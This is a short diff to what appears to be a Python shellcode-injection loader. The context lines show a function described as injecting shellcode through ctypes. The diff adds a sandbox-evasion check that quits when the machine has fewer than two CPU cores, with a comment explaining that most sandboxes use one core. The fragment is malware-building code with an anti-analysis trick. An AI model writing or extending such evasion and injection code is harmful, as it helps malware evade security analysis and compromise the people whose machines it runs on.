@@ -18,6 +18,10 @@ from Crypto.Cipher import AES
 import multiprocessing
 import threading
 
+# added sandbox evasion here - most sandboxes use only 1 core
+if multiprocessing.cpu_count() < 2:
+        exit()
+
 # define our shellcode injection code through ctypes
 def injection(sc):
     sc = sc.decode("string_escape")
